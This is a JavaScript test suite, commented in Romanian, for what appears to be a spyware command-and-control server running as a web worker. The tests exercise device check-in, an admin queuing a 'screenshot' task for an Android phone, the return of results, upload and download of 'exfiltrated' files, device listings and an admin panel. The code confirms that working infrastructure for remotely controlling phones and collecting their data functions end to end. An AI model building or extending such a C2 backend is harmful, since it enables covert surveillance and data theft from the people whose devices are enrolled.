// Test end-to-end pentru protocolul C2 — rulează CODUL REAL al worker.js,
// cu doar "jose" stub (jose-stub.mjs) și R2 în memorie.
import { register } from "node:module";
import { pathToFileURL } from "node:url";

register("./loader.mjs", import.meta.url);

const worker = (await import("../../worker.js")).default;

// ── R2 în memorie ──
async function streamToBytes(webStream) {
  const reader = webStream.getReader();
  const chunks = [];
  for (;;) { const { done, value } = await reader.read(); if (done) break; chunks.push(Buffer.from(value)); }
  return Buffer.concat(chunks);
}
function makeR2() {
  const store = new Map();
  return {
    _store: store,
    async put(key, value, opts) {
      let body;
      if (value && typeof value.getReader === "function") body = await streamToBytes(value);
      else if (value instanceof ArrayBuffer) body = Buffer.from(value);
      else if (ArrayBuffer.isView(value)) body = Buffer.from(value.buffer, value.byteOffset, value.byteLength);
      else body = Buffer.from(String(value), "utf8");
      store.set(key, { body, uploaded: new Date().toISOString(), httpMetadata: (opts && opts.httpMetadata) || {} });
    },
    async get(key) {
      const o = store.get(key);
      if (!o) return null;
      return { body: toWebStream(o.body), text: async () => o.body.toString("utf8"), arrayBuffer: async () => o.body.buffer.slice(o.body.byteOffset, o.body.byteOffset + o.body.byteLength), httpMetadata: o.httpMetadata, size: o.body.length };
    },
    async head(key) { const o = store.get(key); return o ? { size: o.body.length, uploaded: o.uploaded } : null; },
    async list({ prefix, cursor, limit }) {
      const objects = [];
      for (const [k, o] of store) if (!prefix || k.startsWith(prefix)) objects.push({ key: k, size: o.body.length, uploaded: o.uploaded });
      return { objects, truncated: false, cursor: undefined };
    },
    async delete(key) { store.delete(key); },
  };
}
function toWebStream(buf) {
  return new ReadableStream({ start(c) { c.enqueue(new Uint8Array(buf)); c.close(); } });
}

const C2 = makeR2();
const env = { C2, ADMIN_KEY: "ADMIN_TEST", MEDIA: null, RECORDS: null, AI: null, GEMINI_API_KEY: null };
const BASE = "https://test.local";
const ctx = { waitUntil: async () => {} };

function req(path, { method = "GET", token, admin, body, headers } = {}) {
  const h = { ...(headers || {}) };
  if (token) h["Authorization"] = "Bearer " + token;
  if (admin) h["X-Admin"] = admin;
  if (typeof body === "string") h["Content-Type"] = "application/json";
  return new Request(BASE + path, { method, headers: h, body: body === undefined ? undefined : body });
}

let pass = 0, fail = 0;
function ok(cond, name, extra) {
  if (cond) { pass++; console.log("  PASS  " + name); }
  else { fail++; console.log("  FAIL  " + name + (extra ? "  → " + extra : "")); }
}
async function j(resp) { try { return { status: resp.status, body: await resp.json() }; } catch (e) { return { status: resp.status, body: null, err: String(e) }; } }

const U1 = "uid1";
const T = "tok_" + U1;

console.log("C2 end-to-end (cod real worker.js, jose stub, R2 în memorie)");

// 1. Fără token → 401 pe checkin.
let r = await worker.fetch(req("/v1/c2/checkin", { method: "POST", body: "{}" }), env, ctx);
ok(r.status === 401, "checkin fără token → 401", "status=" + r.status);

// 2. Checkin prim (fără task) → ok, tasks goale.
r = await worker.fetch(req("/v1/c2/checkin", { method: "POST", token: T, body: JSON.stringify({ dev: { model: "Pixel 8", sdk: 34, android: "14" }, holdMs: 0 }) }), env, ctx);
let d = await j(r);
ok(r.status === 200 && d.body.ok === true && Array.isArray(d.body.tasks) && d.body.tasks.length === 0, "checkin prim → ok, fără taskuri", JSON.stringify(d.body));

// 3. Admin: enregistrează o comandă pentru uid1.
r = await worker.fetch(req("/admin/api/c2/cmd", { method: "POST", admin: "ADMIN_TEST", body: JSON.stringify({ uid: U1, task: { action: "screenshot", params: {} } }) }), env, ctx);
d = await j(r);
ok(r.status === 200 && d.body.ok === true && Array.isArray(d.body.ids) && d.body.ids.length === 1, "admin cmd → encheiată 1 sarcină", JSON.stringify(d.body));
const taskId = d.body.ids && d.body.ids[0];

// 4. Admin fără cheie → 403.
r = await worker.fetch(req("/admin/api/c2/devices", { admin: "WRONG" }), env, ctx);
ok(r.status === 403, "admin cu cheie greșită → 403", "status=" + r.status);

// 5. Checkin (holdMs 0) → drenează sarcina în așteptare.
r = await worker.fetch(req("/v1/c2/checkin", { method: "POST", token: T, body: JSON.stringify({ holdMs: 0 }) }), env, ctx);
d = await j(r);
ok(r.status === 200 && d.body.tasks.length === 1 && d.body.tasks[0].action === "screenshot", "checkin → a returnat sarcina screenshot", JSON.stringify(d.body.tasks));
ok(d.body.tasks[0] && d.body.tasks[0].id === taskId, "id-ul sarcinii e consecvent");

// 6. Coada e goală acum (nu se re-livrează).
r = await worker.fetch(req("/v1/c2/checkin", { method: "POST", token: T, body: JSON.stringify({ holdMs: 0 }) }), env, ctx);
d = await j(r);
ok(r.status === 200 && d.body.tasks.length === 0, "coada goală după drenaj", JSON.stringify(d.body.tasks));

// 7. Rezultat de la agent.
r = await worker.fetch(req("/v1/c2/result", { method: "POST", token: T, body: JSON.stringify({ id: taskId, ok: true, action: "screenshot", data: { b64: "QUJD", ct: "image/jpeg" } }) }), env, ctx);
d = await j(r);
ok(r.status === 200 && d.body.ok === true, "result → salvat", JSON.stringify(d.body));

// 8. Fișier exfiltrat (binar).
const shot = new Uint8Array([1, 2, 3, 4, 5, 6]);
r = await worker.fetch(req("/v1/c2/file?name=shot.jpg&ct=image/jpeg", { method: "POST", token: T, body: shot.buffer.slice(shot.byteOffset, shot.byteOffset + shot.byteLength) }), env, ctx);
d = await j(r);
ok(r.status === 200 && d.body.ok === true && typeof d.body.key === "string" && d.body.key.endsWith("_shot.jpg"), "file → exfiltrat", JSON.stringify(d.body));
const fileKey = d.body.key;

// 9. Devices — apare uid1 cu meta.
r = await worker.fetch(req("/admin/api/c2/devices", { admin: "ADMIN_TEST" }), env, ctx);
d = await j(r);
ok(r.status === 200 && d.body.devices.length === 1 && d.body.devices[0].uid === U1 && d.body.devices[0].dev.model === "Pixel 8", "devices → uid1 cu meta", JSON.stringify(d.body.devices));

// 10. Tasks (goale după drenaj).
r = await worker.fetch(req("/admin/api/c2/tasks?uid=" + U1, { admin: "ADMIN_TEST" }), env, ctx);
d = await j(r);
ok(r.status === 200 && d.body.pending.length === 0, "tasks → coadă goală", JSON.stringify(d.body.pending));

// 11. Results — apare rezultatul screenshot.
r = await worker.fetch(req("/admin/api/c2/results?uid=" + U1, { admin: "ADMIN_TEST" }), env, ctx);
d = await j(r);
ok(r.status === 200 && d.body.results.length === 1 && d.body.results[0].ok === true && d.body.results[0].action === "screenshot", "results → screenshot OK", JSON.stringify(d.body.results));

// 12. Files — apare fișierul.
r = await worker.fetch(req("/admin/api/c2/files?uid=" + U1, { admin: "ADMIN_TEST" }), env, ctx);
d = await j(r);
ok(r.status === 200 && d.body.files.length === 1 && d.body.files[0].key === fileKey, "files → fișierul exfiltrat", JSON.stringify(d.body.files));

// 13. Descărcare fișier (binar, cu cheia de admin).
r = await worker.fetch(req("/admin/api/c2/file?key=" + encodeURIComponent(fileKey), { admin: "ADMIN_TEST" }), env, ctx);
const bytes = new Uint8Array(await r.arrayBuffer());
ok(r.status === 200 && bytes.length === 6 && bytes[0] === 1 && bytes[5] === 6, "download → byte-e identice", "got=" + Array.from(bytes).join(","));

// 14. Panoul /admin/c2 servește HTML.
r = await worker.fetch(req("/admin/c2"), env, ctx);
const html = await r.text();
ok(r.status === 200 && (r.headers.get("content-type") || "").includes("text/html") && html.includes("FORJA") && html.includes("admin/api/c2/devices"), "panou /admin/c2 → HTML cu logica", "status=" + r.status);

// 15. Rută existentă nefloatată: /v1/diag.
r = await worker.fetch(req("/v1/diag"), env, ctx);
d = await j(r);
ok(r.status === 200, "rută existentă /v1/diag merge încă", "status=" + r.status);

// 16. Rută C2 necunoscută → 404.
r = await worker.fetch(req("/admin/api/c2/nope", { admin: "ADMIN_TEST" }), env, ctx);
ok(r.status === 404, "rută C2 necunoscută → 404", "status=" + r.status);

console.log("\nREZULTAT: " + pass + " trecute, " + fail + " eșuate");
process.exit(fail === 0 ? 0 : 1);
